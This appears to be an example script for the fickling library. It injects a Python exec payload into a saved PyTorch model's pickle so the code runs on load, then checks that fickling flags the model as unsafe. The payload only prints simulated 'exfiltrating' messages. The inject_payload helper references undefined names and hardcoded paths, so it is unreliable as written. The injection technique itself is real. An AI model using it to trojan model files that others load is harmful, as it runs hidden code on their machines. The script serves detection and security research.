"""
Tested with python3.9
This is tutorial code for generating, saving, and loading models in Pytorch
https://pytorch.org/tutorials/beginner/saving_loading_models.html
"""

import shutil
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Optional

import torch
import torch.nn.functional as F
from torch import nn, optim

from fickling.fickle import Pickled


# Define model
class TheModelClass(nn.Module):
    def __init__(self):
        super(TheModelClass, self).__init__()
        self.conv1 = nn.Conv2d(3, 6, 5)
        self.pool = nn.MaxPool2d(2, 2)
        self.conv2 = nn.Conv2d(6, 13, 5)
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        x = self.pool(F.relu(self.conv1(x)))
        x = self.pool(F.relu(self.conv2(x)))
        x = x.view(-1, 16 * 5 * 5)
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x


class PyTorchModelWrapper:
    def __init__(self, path: Path):
        self.path: Path = path
        self._pickled: Optional[Pickled] = None

    def clone(self) -> "PyTorchModelWrapper":
        ret = PyTorchModelWrapper(self.path)
        if self._pickled is not None:
            ret._pickled = Pickled(self._pickled)
        return ret

    @property
    def pickled(self) -> Pickled:
        if self._pickled is None:
            with TemporaryDirectory() as archive_dir:
                shutil.unpack_archive(self.path, archive_dir, "zip")
                pickle_file_path = Path(archive_dir) / "archive" / "data.pkl"
                with open(pickle_file_path, "rb") as pickle_file:
                    self._pickled = Pickled.load(pickle_file)
        return self._pickled

    def save(self, output_path: Path) -> "PyTorchModelWrapper":
        if self._pickled is None:
            # nothing has been changed, so just copy the input model
            shutil.copyfile(self.path, output_path)
        else:
            with TemporaryDirectory() as output_dir:
                shutil.unpack_archive(self.path, output_dir, "zip")
                pickle_file_path = Path(output_dir) / "archive" / "data.pkl"
                with open(pickle_file_path, "wb") as pickle_file:
                    self.pickled.dump(pickle_file)
                basename = output_path
                if basename.suffix == ".zip":
                    basename = Path(str(basename)[:-4])
                shutil.make_archive(basename, "zip", output_dir, "archive")
        return PyTorchModelWrapper(output_path)

    def load(self):
        return torch.load(self.path)

    def eval(self):
        return self.load().eval()


def inject_payload(pytorch_model_path: Path, payload: str, output_model_path: Path):
    with TemporaryDirectory() as d:
        shutil.unpack_archive("poc.zip", d, "zip")
        pickle_file_path = Path(d) / "archive/data.pkl"
        with open(pickle_file_path, "rb") as pickled_file:
            try:
                pickled = pickle.Pickled.load(pickled_file)
                log("Inserting file exfiltration backdoor into serialized model")

                pickled.insert_python_exec(
                    PAYLOAD, run_first=True, use_output_as_unpickle_result=False
                )
                # Open up the file for writing
                pickled_file.close()
                pickled_file = open(pickle_file_path, "wb")
                try:
                    pickled.dump(pickled_file)
                    # print("Dumped!")
                    pickled_file.close()
                    # Repack archive
                    shutil.make_archive("test_poc", "zip", "/tmp/test_data", "archive")
                    print("Loading trojan archive!")
                    print("=" * 30)
                    new_model = torch.load("test_poc.zip")
                    new_model.eval()
                    optimizer = optim.SGD(new_model.parameters(), lr=0.001, momentum=0.9)
                    # Print model's state_dict
                    print("Model's state_dict:")
                    for param_tensor in new_model.state_dict():
                        print(
                            param_tensor,
                            "\t",
                            new_model.state_dict()[param_tensor].size(),
                        )

                    # Print optimizer's state_dict
                    print("Optimizer's state_dict:")
                    for var_name in optimizer.state_dict():
                        print(var_name, "\t", optimizer.state_dict()[var_name])

                except Exception as e:
                    print("Error writing pickled file! ", e)

            except Exception as e:
                print("Error loading pickled file! ", e)


if __name__ == "__main__":
    import sys

    # Initialize model
    model = TheModelClass()

    # NOTE This does not throw an error/check if a file exists already
    torch.save(model, "pytorch_standard_model.zip")
    print(f"Created benign {Path('pytorch_standard_model.zip').absolute()!s}")
    wrapper = PyTorchModelWrapper(Path("pytorch_standard_model.zip"))
    wrapper.eval()

    EXFIL_PAYLOAD = """exec("import os
for file in os.listdir():
    print(f'Exfiltrating {file}')
")"""

    exfil_model = wrapper.clone()
    exfil_model.pickled.insert_python_exec(
        EXFIL_PAYLOAD, run_first=True, use_output_as_unpickle_result=False
    )
    exfil_model = exfil_model.save(Path("pytorch_exfil_poc.zip"))
    print(f"Created PyTorch exfiltration exploit payload PoC {exfil_model.path.absolute()!s}")

    is_safe = exfil_model.pickled.is_likely_safe
    sys.stdout.write("Fickling correctly classifies this model as unsafe? ")
    if not is_safe:
        print("✅")
    else:
        print("❌")
    assert not is_safe

    print("Loading the model... (you should see simulated exfil messages during the load)")

    print(f"{'=' * 30} BEGIN LOAD {'=' * 30}")
    exfil_model.eval()
    print(f"{'=' * 31} END LOAD {'=' * 31}")
